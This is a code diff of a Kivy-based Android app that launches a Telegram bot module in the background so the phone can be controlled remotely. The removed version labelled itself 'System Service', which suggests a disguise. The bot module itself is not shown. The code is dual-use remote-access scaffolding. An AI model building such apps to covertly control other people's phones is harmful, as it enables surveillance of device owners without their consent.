@@ -1,52 +1,27 @@
-"""
-📱 Android Remote Control - Main Application
-Kivy-based app that runs Telegram bot in background
-"""
 import kivy
-kivy.require('2.1.0')
-
 from kivy.app import App
 from kivy.uix.label import Label
 import threading
 import os
 import sys
 
-def start_bot_service():
-    """Start Telegram bot service in background"""
-    try:
-        # Add current directory to Python path
-        current_dir = os.path.dirname(os.path.abspath(__file__))
-        if current_dir not in sys.path:
-            sys.path.append(current_dir)
-        
-        # Import and start bot
-        import bot_control
-        print("✅ Telegram bot service started successfully")
-        
-        # Write status file
-        with open("/sdcard/omen_status.txt", "w") as f:
-            f.write(f"Service active - PID: {os.getpid()}")
-            
-    except Exception as e:
-        # Write error to file
-        error_msg = f"Error starting bot: {str(e)}"
-        print(error_msg)
-        with open("/sdcard/omen_error.txt", "w") as f:
-            f.write(error_msg)
+# Fungsi agar aplikasi punya akses folder internal yang aman
+def get_path(filename):
+    if sys.platform == 'android':
+        from android.storage import app_storage_path
+        return os.path.join(app_storage_path(), filename)
+    return filename
 
-class RemoteControlApp(App):
-    """Main Kivy application"""
+class RemoteApp(App):
     def build(self):
-        # Start bot service in background thread
-        service_thread = threading.Thread(target=start_bot_service, daemon=True)
-        service_thread.start()
-        
-        # Create simple UI
-        return Label(
-            text="System Service\nRunning in background",
-            font_size='20sp',
-            halign='center'
-        )
+        # Menjalankan bot Telegram di background agar UI tidak macet
+        try:
+            import bot_control
+            threading.Thread(target=bot_control.start_bot, daemon=True).start()
+        except Exception as e:
+            print(f"Bot Error: {e}")
+
+        return Label(text="Service Remote Aktif\nKontrol via Telegram")
 
 if __name__ == '__main__':
-    RemoteControlApp().run()
+    RemoteApp().run()
